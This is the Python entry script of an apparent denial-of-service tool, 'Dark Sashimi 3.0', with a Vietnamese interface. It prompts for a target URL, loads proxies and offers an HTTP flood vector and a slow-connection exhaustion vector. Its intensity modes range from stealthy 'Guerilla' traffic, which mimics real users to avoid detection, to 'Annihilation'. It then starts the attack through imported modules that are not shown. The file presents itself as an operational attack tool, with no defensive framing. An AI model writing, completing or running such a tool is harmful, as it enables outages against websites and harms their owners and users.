#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import time
from urllib.parse import urlparse

import config
from utils.display import display_main_banner, console, clear_screen
from utils.system_check import initial_environment_check
from utils.network import ProxyManager
from core.analytics import TargetAnalytics
from core.attack_manager import AttackManager

def main():
    try:
        clear_screen()
        display_main_banner()
        initial_environment_check()
        
        proxy_manager = ProxyManager()
        proxy_manager.load_proxies()

        target_url = console.input("[bold gold1]Vui lòng nhập URL Mục tiêu:[/bold gold1] ")
        if not urlparse(target_url).scheme:
            target_url = "https://" + target_url

        analytics = TargetAnalytics(target_url)
        analytics.run_analysis()

        console.print("\n[bold slate_blue1]Chọn Vector Tấn công:[/bold slate_blue1]")
        console.print("[bold cyan]1.[/bold cyan] [light_green]HTTP Matrix[/light_green] (RPS cao, liên tục thay đổi phương thức)")
        console.print("[bold cyan]2.[/bold cyan] [light_green]Slow Pipe[/light_green] (Băng thông thấp, làm cạn kiệt kết nối server)")
        vector_choice = console.input("[bold gold1]Lựa chọn [1-2]: [/bold gold1]") or "1"
        
        console.print("\n[bold slate_blue1]Chọn Cường độ Tấn công:[/bold slate_blue1]")
        console.print("[bold cyan]1.[/bold cyan] [light_green]Du kích  [/light_green] - Chậm và ẩn mình, mô phỏng người dùng thật.")
        console.print("[bold cyan]2.[/bold cyan] [light_green]Bão hòa  [/light_green] - Cường độ cao, gây quá tải cho máy chủ.")
        console.print("[bold cyan]3.[/bold cyan] [light_green]Hủy diệt [/light_green] - Xung kích tổng lực, cường độ tối đa.")
        mode_choice = console.input("[bold gold1]Cường độ [1-3]: [/bold gold1]") or "2"
        
        modes = {"1": "Guerilla", "2": "Saturation", "3": "Annihilation"}
        attack_mode = modes.get(mode_choice, "Saturation")

        threads = int(console.input(f"[bold gold1]Số luồng (mặc định {config.DEFAULT_THREADS[attack_mode]}): [/bold gold1]") or str(config.DEFAULT_THREADS[attack_mode]))

        clear_screen()
        console.print("\n" + "═"*60)
        console.print(f"[bold gold1]  XÁC NHẬN THÔNG TIN CHIẾN DỊCH[/bold gold1]")
        console.print("─"*60)
        console.print(f"[bold white]  Mục tiêu:[/bold white] [cyan]{target_url}[/cyan]")
        console.print(f"[bold white]  Vector:  [/bold white] [cyan]{'HTTP Matrix' if vector_choice == '1' else 'Slow Pipe'}[/cyan]")
        console.print(f"[bold white]  Cường độ:[/bold white] [cyan]{attack_mode}[/cyan]")
        console.print(f"[bold white]  Luồng:   [/bold white] [cyan]{threads}[/cyan]")
        console.print("═"*60 + "\n")
        
        console.input("[bold blink red]NHẤN ENTER ĐỂ BẮT ĐẦU CHIẾN DỊCH...[/bold blink red]")

        manager = AttackManager(
            target_url=target_url,
            vector_choice=vector_choice,
            mode=attack_mode,
            threads=threads
        )
        manager.start_attack()

    except KeyboardInterrupt:
        if 'stop_event' in dir(config):
            config.stop_event.set()
        time.sleep(1)
        console.print("\n\n[bold yellow]! Chiến dịch đã được dừng theo lệnh người dùng.[/bold yellow]")
    except Exception as e:
        console.print(f"\n[bold red]LỖI HỆ THỐNG KHÔNG XÁC ĐỊNH: {e}[/bold red]")
    finally:
        console.print("[bold green]Dark Sashimi 3.0 đã hoàn thành nhiệm vụ.[/bold green]")
        sys.exit(0)

if __name__ == "__main__":
    main()

